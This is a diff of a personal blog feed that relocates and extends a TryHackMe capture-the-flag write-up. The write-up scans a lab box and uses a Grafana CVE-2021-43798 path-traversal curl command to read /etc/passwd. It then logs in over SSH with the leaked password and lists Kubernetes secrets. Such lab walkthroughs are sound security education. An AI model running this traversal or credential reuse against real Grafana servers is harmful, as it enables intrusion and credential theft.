@@ -869,94 +869,6 @@ Install Ansible</li>
 </span></span><span style="display:flex;"><span>sudo systemctl status haproxy  
 </span></span></code></pre></div></li>
 </ul>
-]]></content></item><item><title>Kubernetes for everyone</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/kubernetes-for-everyone/</link><pubDate>Fri, 11 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/kubernetes-for-everyone/</guid><description>Hola, a friend of mine thought it&amp;rsquo;d be cool for me to check out this room on the THM platform since they know I&amp;rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in! Room link: https://tryhackme.com/jr/kubernetesforyouly
-Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</description><content type="html"><![CDATA[<p>Hola, a friend of mine thought it&rsquo;d be cool for me to check out this room on the THM platform since they know I&rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in!
-<img src="/files/k8s.png#center" alt=""></p>
-<blockquote>
-<p>Room link: <a href="https://tryhackme.com/jr/kubernetesforyouly">https://tryhackme.com/jr/kubernetesforyouly</a></p>
-</blockquote>
-<hr>
-<p>Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</p>
-<ul>
-<li>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ nmap -F 10.10.55.59
-</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-08-16 11:07 EDT
-</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.55.59
-</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
-</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">96</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
-</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
-</span></span><span style="display:flex;"><span>22/tcp   open  ssh
-</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
-</span></span><span style="display:flex;"><span>3000/tcp open  ppp
-</span></span><span style="display:flex;"><span>5000/tcp open  upnp
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.85 seconds
-</span></span></code></pre></div></li>
-</ul>
-<p>I excitedly launched my web browser and entered the &ldquo;<!-- raw HTML omitted -->:5000&rdquo;. And guess what? I came across this super fun game called &ldquo;Etch A Sketch&rdquo;!</p>
-<ul>
-<li><img src="/files/sketch.png#center" alt=""></li>
-</ul>
-<p>However, during my search, I stumbled upon the &lsquo;main.css&rsquo; file. To my surprise, I discovered a Pastebin link within it. Upon opening the link, I was greeted with a base32 encoded string.
-But you know what really caught my attention? While I was looking around, I spotted something interesting in the &lsquo;main.css&rsquo; file. It was a Pastebin link! Curiosity piqued, I followed the link and found a base32 encoded string waiting for me. Exciting stuff!</p>
-<ul>
-<li>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Bowlby+One+SC&amp;display=swap&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#75715e">/* @import url(&#34;https://pastebin.com/cPs69B0y&#34;); */</span>
-</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Vollkorn:wght@500&amp;display=swap&#34;</span>);
-</span></span></code></pre></div></li>
-</ul>
-<p><img src="/files/b32.png#center" alt="">
-After decoding the string, it revealed the word <code>vagrant</code>,which led us to discover the user we were searching for.
-Curious about the other app running on port 3000, I decided to take a closer look. It turned out to be Grafana, a monitoring tool running version 8.3. After some Googling, I stumbled upon a CVE-2021-43798 that pointed towards a Local File Inclusion (LFI) vulnerability.</p>
-<blockquote>
-<p><a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/</a></p>
-</blockquote>
-<ul>
-<li>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ curl --path-as-is 10.10.126.15:3000/public/plugins/alertmanager/../../../../../../../../etc/passwd
-</span></span><span style="display:flex;"><span>root❌0:0:root:/root:/bin/ash
-</span></span><span style="display:flex;"><span>bin❌1:1:bin:/bin:/sbin/nologin
-</span></span><span style="display:flex;"><span>daemon❌2:2:daemon:/sbin:/sbin/nologin
-</span></span><span style="display:flex;"><span>adm❌3:4:adm:/var/adm:/sbin/nologin
-</span></span><span style="display:flex;"><span>lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
-</span></span><span style="display:flex;"><span>sync❌5:0:sync:/sbin:/bin/sync
-</span></span><span style="display:flex;"><span>shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
-</span></span><span style="display:flex;"><span>halt❌7:0:halt:/sbin:/sbin/halt
-</span></span><span style="display:flex;"><span>mail❌8:12:mail:/var/mail:/sbin/nologin
-</span></span><span style="display:flex;"><span>news❌9:13:news:/usr/lib/news:/sbin/nologin
-</span></span><span style="display:flex;"><span>uucp❌10:14:uucp:/var/spool/uucppublic:/sbin/nologin
-</span></span><span style="display:flex;"><span>operator❌11:0:operator:/root:/sbin/nologin
-</span></span><span style="display:flex;"><span>man❌13:15:man:/usr/man:/sbin/nologin
-</span></span><span style="display:flex;"><span>postmaster❌14:12:postmaster:/var/mail:/sbin/nologin
-</span></span><span style="display:flex;"><span>cron❌16:16:cron:/var/spool/cron:/sbin/nologin
-</span></span><span style="display:flex;"><span>ftp❌21:21::/var/lib/ftp:/sbin/nologin
-</span></span><span style="display:flex;"><span>sshd❌22:22:sshd:/dev/null:/sbin/nologin
-</span></span><span style="display:flex;"><span>at❌25:25:at:/var/spool/cron/atjobs:/sbin/nologin
-</span></span><span style="display:flex;"><span>squid❌31:31:Squid:/var/cache/squid:/sbin/nologin
-</span></span><span style="display:flex;"><span>xfs❌33:33:X Font Server:/etc/X11/fs:/sbin/nologin
-</span></span><span style="display:flex;"><span>games❌35:35:games:/usr/games:/sbin/nologin
-</span></span><span style="display:flex;"><span>cyrus❌85:12::/usr/cyrus:/sbin/nologin
-</span></span><span style="display:flex;"><span>vpopmail❌89:89::/var/vpopmail:/sbin/nologin
-</span></span><span style="display:flex;"><span>ntp❌123:123:NTP:/var/empty:/sbin/nologin
-</span></span><span style="display:flex;"><span>smmsp❌209:209:smmsp:/var/spool/mqueue:/sbin/nologin
-</span></span><span style="display:flex;"><span>guest❌405💯guest:/dev/null:/sbin/nologin
-</span></span><span style="display:flex;"><span>nobody❌65534:65534:nobody:/:/sbin/nologin
-</span></span><span style="display:flex;"><span>grafana❌472:0:hereiamatctf907:/home/grafana:/sbin/nologin
-</span></span></code></pre></div></li>
-</ul>
-<p>And voilà! We struck gold and managed to uncover the password. lets do the SSH now!</p>
-<ul>
-<li>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
-</span></span><span style="display:flex;"><span>└─$ sshpass -p hereiamatctf907 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no vagrant@10.10.126.15
-</span></span></code></pre></div></li>
-</ul>
-<h4 id="your-secret-crush">Your Secret Crush</h4>
-<p>switch root and run the following command to list secrets
-dd</p>
 ]]></content></item><item><title>Certifications exam notes</title><link>https://chxmxii.github.io/portfolio/posts/2023/08/certifications-exam-notes/</link><pubDate>Tue, 08 Aug 2023 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2023/08/certifications-exam-notes/</guid><description>These are some useful notes I gathered while pursuing my certifications RHCE EX294 Notes and tips
 RHCCS EX188 Notes and tips
 RHCSA EX200 Notes and tips
@@ -2582,6 +2494,110 @@ Note: kubectl is already installed on the host, you can check your deployments i
 </span></span><span style="display:flex;"><span>terraform apply
 </span></span></code></pre></div></li>
 </ul>
+]]></content></item><item><title>Kubernetes for everyone</title><link>https://chxmxii.github.io/portfolio/posts/2022/12/kubernetes-for-everyone/</link><pubDate>Sun, 11 Dec 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/12/kubernetes-for-everyone/</guid><description>Hola, a friend of mine thought it&amp;rsquo;d be cool for me to check out this room on the THM platform since they know I&amp;rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in! Room link: https://tryhackme.com/jr/kubernetesforyouly
+Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</description><content type="html"><![CDATA[<p>Hola, a friend of mine thought it&rsquo;d be cool for me to check out this room on the THM platform since they know I&rsquo;m really into Kubernetes and security. I thought it sounded like a fun idea, so I jumped right in!
+<img src="/files/k8s.png#center" alt=""></p>
+<blockquote>
+<p>Room link: <a href="https://tryhackme.com/jr/kubernetesforyouly">https://tryhackme.com/jr/kubernetesforyouly</a></p>
+</blockquote>
+<hr>
+<p>Okay, so I kicked things off by giving the IP address a scan, hoping to stumble upon something cool or significant. And you know what? My instincts were right on the money – I actually discovered two apps listening on ports 5000 and 3000!</p>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nmap -F 10.10.55.59
+</span></span><span style="display:flex;"><span>Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2023-08-16 11:07 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 10.10.55.59
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.16s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">96</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>PORT     STATE SERVICE
+</span></span><span style="display:flex;"><span>22/tcp   open  ssh
+</span></span><span style="display:flex;"><span>111/tcp  open  rpcbind
+</span></span><span style="display:flex;"><span>3000/tcp open  ppp
+</span></span><span style="display:flex;"><span>5000/tcp open  upnp
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 0.85 seconds
+</span></span></code></pre></div></li>
+</ul>
+<p>I excitedly launched my web browser and entered the &ldquo;<!-- raw HTML omitted -->:5000&rdquo;. And guess what? I came across this super fun game called &ldquo;Etch A Sketch&rdquo;!</p>
+<ul>
+<li><img src="/files/sketch.png#center" alt=""></li>
+</ul>
+<p>However, during my search, I stumbled upon the &lsquo;main.css&rsquo; file. To my surprise, I discovered a Pastebin link within it. Upon opening the link, I was greeted with a base32 encoded string.
+But you know what really caught my attention? While I was looking around, I spotted something interesting in the &lsquo;main.css&rsquo; file. It was a Pastebin link! Curiosity piqued, I followed the link and found a base32 encoded string waiting for me. Exciting stuff!</p>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Bowlby+One+SC&amp;display=swap&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* @import url(&#34;https://pastebin.com/cPs69B0y&#34;); */</span>
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">@</span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#34;https://fonts.googleapis.com/css2?family=Vollkorn:wght@500&amp;display=swap&#34;</span>);
+</span></span></code></pre></div></li>
+</ul>
+<p><img src="/files/b32.png#center" alt="">
+After decoding the string, it revealed the word <code>vagrant</code>,which led us to discover the user we were searching for.
+Curious about the other app running on port 3000, I decided to take a closer look. It turned out to be Grafana, a monitoring tool running version 8.3. After some Googling, I stumbled upon a CVE-2021-43798 that pointed towards a Local File Inclusion (LFI) vulnerability.</p>
+<blockquote>
+<p><a href="https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/">https://vk9-sec.com/grafana-8-3-0-directory-traversal-and-arbitrary-file-read-cve-2021-43798/</a></p>
+</blockquote>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ curl --path-as-is 10.10.126.15:3000/public/plugins/alertmanager/../../../../../../../../etc/passwd
+</span></span><span style="display:flex;"><span>root❌0:0:root:/root:/bin/ash
+</span></span><span style="display:flex;"><span>bin❌1:1:bin:/bin:/sbin/nologin
+</span></span><span style="display:flex;"><span>daemon❌2:2:daemon:/sbin:/sbin/nologin
+</span></span><span style="display:flex;"><span>adm❌3:4:adm:/var/adm:/sbin/nologin
+</span></span><span style="display:flex;"><span>lp❌4:7:lp:/var/spool/lpd:/sbin/nologin
+</span></span><span style="display:flex;"><span>sync❌5:0:sync:/sbin:/bin/sync
+</span></span><span style="display:flex;"><span>shutdown❌6:0:shutdown:/sbin:/sbin/shutdown
+</span></span><span style="display:flex;"><span>halt❌7:0:halt:/sbin:/sbin/halt
+</span></span><span style="display:flex;"><span>mail❌8:12:mail:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>news❌9:13:news:/usr/lib/news:/sbin/nologin
+</span></span><span style="display:flex;"><span>uucp❌10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+</span></span><span style="display:flex;"><span>operator❌11:0:operator:/root:/sbin/nologin
+</span></span><span style="display:flex;"><span>man❌13:15:man:/usr/man:/sbin/nologin
+</span></span><span style="display:flex;"><span>postmaster❌14:12:postmaster:/var/mail:/sbin/nologin
+</span></span><span style="display:flex;"><span>cron❌16:16:cron:/var/spool/cron:/sbin/nologin
+</span></span><span style="display:flex;"><span>ftp❌21:21::/var/lib/ftp:/sbin/nologin
+</span></span><span style="display:flex;"><span>sshd❌22:22:sshd:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>at❌25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+</span></span><span style="display:flex;"><span>squid❌31:31:Squid:/var/cache/squid:/sbin/nologin
+</span></span><span style="display:flex;"><span>xfs❌33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+</span></span><span style="display:flex;"><span>games❌35:35:games:/usr/games:/sbin/nologin
+</span></span><span style="display:flex;"><span>cyrus❌85:12::/usr/cyrus:/sbin/nologin
+</span></span><span style="display:flex;"><span>vpopmail❌89:89::/var/vpopmail:/sbin/nologin
+</span></span><span style="display:flex;"><span>ntp❌123:123:NTP:/var/empty:/sbin/nologin
+</span></span><span style="display:flex;"><span>smmsp❌209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+</span></span><span style="display:flex;"><span>guest❌405💯guest:/dev/null:/sbin/nologin
+</span></span><span style="display:flex;"><span>nobody❌65534:65534:nobody:/:/sbin/nologin
+</span></span><span style="display:flex;"><span>grafana❌472:0:hereiamatctf907:/home/grafana:/sbin/nologin
+</span></span></code></pre></div></li>
+</ul>
+<p>And voilà! We struck gold and managed to uncover the password. lets do the SSH now!</p>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ sshpass -p hereiamatctf907 ssh -o StrictHostKeyChecking<span style="color:#f92672">=</span>no vagrant@10.10.126.15
+</span></span></code></pre></div></li>
+</ul>
+<h4 id="your-secret-crush">Your Secret Crush</h4>
+<p>Here&rsquo;s a little nudge in the right direction: &ldquo;If you want to keep a secret, you must also hide it from yourself.&rdquo; It&rsquo;s like a secret within a secret, right? And hey, remember how Kubernetes lets you stash away secrets? That&rsquo;s a pretty big hint! Now, hop into root mode and give this command a go to see a list of secrets. 🕵️‍♂️</p>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vagrant@johnny:~$ sudo ps aux | grep root
+</span></span><span style="display:flex;"><span>vagrant@johnny:~$ k0s kubectl get secret
+</span></span></code></pre></div></li>
+</ul>
+<blockquote>
+<p>The connection to the server 10.0.2.15:6443 was refused - did you specify the right host or port?
+you can fix this by running the following commands</p>
+</blockquote>
+<ul>
+<li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo -i
+</span></span><span style="display:flex;"><span>swapoff -a
+</span></span></code></pre></div></li>
+</ul>
+<p>[to be continued..]</p>
 ]]></content></item><item><title>Understanding CI/CD</title><link>https://chxmxii.github.io/portfolio/posts/2022/10/understanding-ci/cd/</link><pubDate>Tue, 25 Oct 2022 00:00:00 +0000</pubDate><guid>https://chxmxii.github.io/portfolio/posts/2022/10/understanding-ci/cd/</guid><description>0 . 1 What is CI/CD : CI/CD is an automated and reliable process for software development and delivery.&amp;amp;* CI/CD’s frequent testing reduces code errors and defects. The main concepts attributed to CI/CD are continuos integration, delivery and deployment. ⇒ The main goal is to reduce the risk involved in deploying software.
 0 . 2 What’s the difference between CI &amp;amp; CD &amp;amp; CD : Countinous integration is an automation process for developers, which is new code changes to an app are regularly built, tested and merged to a shared repository.</description><content type="html"><![CDATA[<p><img src="/files/cicdlogo.png" alt=""></p>
 <h3 id="0--1-what-is-cicd-">0 . 1 What is CI/CD :</h3>
